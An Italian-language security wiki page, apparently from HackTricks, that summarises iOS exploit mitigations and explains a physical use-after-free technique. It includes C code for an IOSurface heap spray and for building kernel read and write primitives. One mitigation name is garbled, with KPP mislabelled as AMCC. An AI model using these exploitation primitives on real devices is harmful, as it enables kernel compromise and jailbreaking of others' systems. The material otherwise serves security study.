# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Mitigazioni degli exploit iOS

- **Code Signing** in iOS funziona richiedendo che ogni porzione di codice eseguibile (app, librerie, estensioni, ecc.) sia firmata crittograficamente con un certificato rilasciato da Apple. Quando il codice viene caricato, iOS verifica la firma digitale rispetto alla root di fiducia di Apple. Se la firma è invalida, assente o modificata, il sistema operativo rifiuta l'esecuzione. Questo impedisce agli attaccanti di iniettare codice malevolo in app legittime o di eseguire binari non firmati, bloccando efficacemente molte catene di exploit che si basano sull'esecuzione di codice arbitrario o manomesso.
- **CoreTrust** è il sottosistema iOS responsabile dell'applicazione della code signing a runtime. Verifica direttamente le firme usando il certificato root di Apple senza fare affidamento su store di fiducia memorizzati, il che significa che solo i binari firmati da Apple (o con entitlement validi) possono essere eseguiti. CoreTrust garantisce che anche se un attaccante manomette un'app dopo l'installazione, modifica librerie di sistema o tenta di caricare codice non firmato, il sistema bloccherà l'esecuzione a meno che il codice non sia ancora correttamente firmato. Questa applicazione rigorosa chiude molti vettori di post-exploitation che versioni più vecchie di iOS permettevano tramite controlli di firma più deboli o aggirabili.
- **Data Execution Prevention (DEP)** marca le regioni di memoria come non eseguibili a meno che non contengano esplicitamente codice. Questo impedisce agli attaccanti di iniettare shellcode in regioni di dati (come lo stack o l'heap) e di eseguirlo, costringendoli a ricorrere a tecniche più complesse come ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** randomizza gli indirizzi di memoria di codice, librerie, stack e heap ad ogni esecuzione del sistema. Questo rende molto più difficile per gli attaccanti prevedere dove si trovino istruzioni o gadget utili, interrompendo molte catene di exploit che dipendono da layout di memoria fissi.
- **KASLR (Kernel ASLR)** applica lo stesso concetto di randomizzazione al kernel iOS. Mescolando l'indirizzo base del kernel ad ogni avvio, impedisce agli attaccanti di localizzare in modo affidabile funzioni o strutture del kernel, aumentando la difficoltà degli exploit a livello kernel che altrimenti otterrebbero il controllo completo del sistema.
- **Kernel Patch Protection (KPP)**, noto anche come **AMCC (Apple Mobile File Integrity)** in iOS, monitora continuamente le pagine di codice del kernel per assicurarsi che non siano state modificate. Se viene rilevata una manomissione—ad esempio un exploit che prova a patchare funzioni del kernel o inserire codice malevolo—il dispositivo paniccherà e si riavvierà immediatamente. Questa protezione rende molto più difficili gli exploit persistenti a livello kernel, poiché gli attaccanti non possono semplicemente fare hook o patch alle istruzioni del kernel senza innescare un crash del sistema.
- **Kernel Text Readonly Region (KTRR)** è una funzionalità hardware-based introdotta sui dispositivi iOS. Utilizza il memory controller della CPU per marcare la sezione di codice (text) del kernel come permanentemente read-only dopo il boot. Una volta bloccata, nemmeno il kernel stesso può modificare questa regione di memoria. Questo impedisce agli attaccanti—e persino al codice privilegiato—from di patchare le istruzioni del kernel a runtime, chiudendo una classe importante di exploit che si basavano sulla modifica diretta del codice kernel.
- **Pointer Authentication Codes (PAC)** usano firme crittografiche incorporate nei bit inutilizzati dei puntatori per verificarne l'integrità prima dell'uso. Quando un puntatore (ad esempio un return address o un function pointer) viene creato, la CPU lo firma con una chiave segreta; prima della dereferenziazione, la CPU controlla la firma. Se il puntatore è stato manomesso, il controllo fallisce e l'esecuzione si interrompe. Questo impedisce agli attaccanti di forgiare o riutilizzare puntatori corrotti in exploit di corruzione della memoria, rendendo tecniche come ROP o JOP molto più difficili da effettuare in modo affidabile.
- **Privilege Access never (PAN)** è una funzionalità hardware che impedisce al kernel (modalità privilegiata) di accedere direttamente alla memoria user-space a meno che non abiliti esplicitamente l'accesso. Questo blocca gli attaccanti che hanno ottenuto code execution nel kernel dal leggere o scrivere facilmente la memoria utente per scalare exploit o rubare dati sensibili. Facendo rispettare una separazione rigorosa, PAN riduce l'impatto degli exploit kernel e blocca molte tecniche comuni di escalation di privilegi.
- **Page Protection Layer (PPL)** è un meccanismo di sicurezza di iOS che protegge regioni critiche di memoria gestite dal kernel, specialmente quelle legate a code signing ed entitlements. Applica protezioni di scrittura rigorose usando la MMU (Memory Management Unit) e controlli aggiuntivi, assicurando che anche codice kernel privilegiato non possa modificare arbitrariamente pagine sensibili. Questo impedisce agli attaccanti che ottengono esecuzione a livello kernel di manomettere strutture critiche per la sicurezza, rendendo significativamente più difficili persistenza e bypass della code signing.


## Physical use-after-free

Questa è una sintesi del post su [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); ulteriori informazioni sull'exploit che usa questa tecnica si trovano anche in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Gestione della memoria in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Lo spazio di indirizzi della **virtual memory address space** per i processi utente su iOS va da **0x0 a 0x8000000000**. Tuttavia, questi indirizzi non mappano direttamente alla memoria fisica. Invece, il **kernel** usa **page tables** per tradurre indirizzi virtuali in effettivi **physical addresses**.

#### Livelli delle Page Tables in iOS

Le page tables sono organizzate gerarchicamente in tre livelli:

1. **L1 Page Table (Level 1)**:
* Ogni entry qui rappresenta un ampio intervallo di virtual memory.
* Copre **0x1000000000 bytes** (o **256 GB**) di virtual memory.
2. **L2 Page Table (Level 2)**:
* Un'entry qui rappresenta una regione più piccola di virtual memory, specificamente **0x2000000 bytes** (32 MB).
* Un'entry L1 può puntare a una L2 table se non riesce a mappare l'intera regione da sola.
3. **L3 Page Table (Level 3)**:
* Questo è il livello più fine, dove ogni entry mappa una singola pagina di **4 KB**.
* Un'entry L2 può puntare a una L3 table se è necessario un controllo più granulare.

#### Mappare la Virtual alla Physical Memory

* **Direct Mapping (Block Mapping)**:
* Alcune entry in una page table mappano direttamente un intervallo di indirizzi virtuali a un intervallo contiguo di indirizzi fisici (come una scorciatoia).
* **Pointer to Child Page Table**:
* Se è necessario un controllo più fine, un'entry in un livello (es. L1) può puntare a una **child page table** al livello successivo (es. L2).

#### Esempio: Mappare un Virtual Address

Supponiamo di provare ad accedere all'indirizzo virtuale **0x1000000000**:

1. **L1 Table**:
* Il kernel controlla l'entry della L1 page table corrispondente a questo virtual address. Se ha un **pointer to an L2 page table**, passa alla L2.
2. **L2 Table**:
* Il kernel controlla la L2 page table per una mappatura più dettagliata. Se questa entry punta a una **L3 page table**, procede lì.
3. **L3 Table**:
* Il kernel cerca l'entry finale L3, che punta al **physical address** della pagina di memoria reale.

#### Esempio di mappatura di indirizzi

Se scrivi il physical address **0x800004000** nel primo indice della L2 table, allora:

* Gli indirizzi virtuali da **0x1000000000** a **0x1002000000** mappano agli indirizzi fisici da **0x800004000** a **0x802004000**.
* Questa è una **block mapping** a livello L2.

In alternativa, se l'entry L2 punta a una L3 table:

* Ogni pagina da 4 KB nell'intervallo virtuale **0x1000000000 -> 0x1002000000** sarebbe mappata da entry individuali nella L3 table.

### Physical use-after-free

Un **physical use-after-free** (UAF) si verifica quando:

1. Un processo **alloca** della memoria come **readable e writable**.
2. Le **page tables** vengono aggiornate per mappare questa memoria a un specifico physical address che il processo può accedere.
3. Il processo **dealloca** (free) la memoria.
4. Tuttavia, a causa di un **bug**, il kernel **dimentica di rimuovere la mapping** dalle page tables, anche se marca la corrispondente memoria fisica come libera.
5. Il kernel può quindi **riallocare questa memoria fisica "freed"** per altri scopi, come dati del kernel.
6. Poiché la mapping non è stata rimossa, il processo può ancora **leggere e scrivere** su quella memoria fisica.

Questo significa che il processo può accedere a **pagine di memoria kernel**, che potrebbero contenere dati o strutture sensibili, potenzialmente permettendo a un attaccante di **manipolare la memoria del kernel**.

### IOSurface Heap Spray

Poiché l'attaccante non può controllare quali specifiche pagine kernel verranno allocate alla memoria liberata, usa una tecnica chiamata **heap spray**:

1. L'attaccante **crea un grande numero di oggetti IOSurface** nella memoria kernel.
2. Ogni oggetto IOSurface contiene un **valore magico** in uno dei suoi campi, rendendolo facile da identificare.
3. Scansionano le pagine liberate per vedere se uno di questi oggetti IOSurface è stato collocato su una pagina liberata.
4. Quando trovano un oggetto IOSurface su una pagina liberata, possono usarlo per **leggere e scrivere la memoria kernel**.

Maggiori informazioni su questo si trovano in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Tieni presente che i dispositivi iOS 16+ (A12+) introducono mitigazioni hardware (come PPL o SPTM) che rendono le tecniche di physical UAF molto meno praticabili.
> PPL applica protezioni MMU rigorose sulle pagine relative a code signing, entitlements e dati sensibili del kernel, quindi anche se una pagina viene riutilizzata, le scritture da userland o da codice kernel compromesso verso pagine protette da PPL sono bloccate.
> Secure Page Table Monitor (SPTM) estende PPL irrobustendo gli stessi aggiornamenti delle page table. Assicura che anche il codice kernel privilegiato non possa rimappare silenziosamente pagine liberate o manomettere le mapping senza passare per controlli sicuri.
> KTRR (Kernel Text Read-Only Region) blocca la sezione di codice del kernel come read-only dopo il boot. Questo impedisce qualsiasi modifica a runtime al codice del kernel, chiudendo un importante vettore di attacco su cui spesso fanno affidamento gli exploit physical UAF.
> Inoltre, le allocazioni di `IOSurface` sono meno prevedibili e più difficili da mappare in regioni accessibili dall'utente, il che rende il trucco della scansione del "valore magico" molto meno affidabile. E `IOSurface` è ora protetto da entitlements e restrizioni di sandbox.

### Processo passo-passo di Heap Spray

1. **Spray IOSurface Objects**: l'attaccante crea molti oggetti IOSurface con un identificatore speciale ("magic value").
2. **Scan Freed Pages**: verifica se uno di questi oggetti è stato allocato su una pagina liberata.
3. **Read/Write Kernel Memory**: manipolando i campi dell'oggetto IOSurface, ottiene la capacità di eseguire **letture e scritture arbitrarie** nella memoria kernel. Questo permette di:
* Usare un campo per **leggere qualsiasi valore a 32-bit** nella memoria kernel.
* Usare un altro campo per **scrivere valori a 64-bit**, ottenendo un primitivo stabile di **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Cerca oggetti **`IOSurface`** in una pagina fisica liberata:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Ottenere lettura/scrittura nel kernel con IOSurface

Dopo aver ottenuto il controllo di un oggetto IOSurface nella memoria kernel (mappato su una pagina fisica liberata accessibile da userspace), possiamo usarlo per **operazioni arbitrarie di lettura e scrittura nel kernel**.

**Key Fields in IOSurface**

L'oggetto IOSurface ha due campi cruciali:

1. **Use Count Pointer**: Permette una **lettura a 32-bit**.
2. **Indexed Timestamp Pointer**: Permette una **scrittura a 64-bit**.

Sovrascrivendo questi puntatori, li reindirizziamo a indirizzi arbitrari nella memoria kernel, abilitando capacità di lettura/scrittura.

#### Lettura a 32-bit nel kernel

Per effettuare una lettura:

1. Sovrascrivi il **use count pointer** per puntare all'indirizzo target meno un offset di 0x14 byte.
2. Usa il metodo `get_use_count` per leggere il valore a quell'indirizzo.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Scrittura Kernel a 64 bit

Per eseguire una scrittura:

1. Sovrascrivi il **indexed timestamp pointer** con l'indirizzo di destinazione.
2. Usa il metodo `set_indexed_timestamp` per scrivere un valore a 64 bit.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Riepilogo del flusso dell'exploit

1. **Trigger Physical Use-After-Free**: Le pagine liberate sono disponibili per il riutilizzo.
2. **Spray IOSurface Objects**: Allocare molti oggetti IOSurface con un unico "magic value" nella memoria kernel.
3. **Identify Accessible IOSurface**: Individuare un IOSurface su una pagina liberata che controlli.
4. **Abuse Use-After-Free**: Modificare i puntatori nell'oggetto IOSurface per consentire **kernel read/write** arbitrari tramite i metodi IOSurface.

Con queste primitive, l'exploit fornisce **32-bit reads** controllate e **64-bit writes** alla memoria kernel. Passi successivi per il jailbreak potrebbero comportare primitive di read/write più stabili, che potrebbero richiedere il bypass di protezioni aggiuntive (es., PPL su dispositivi arm64e più recenti).

{{#include ../../banners/hacktricks-training.md}}
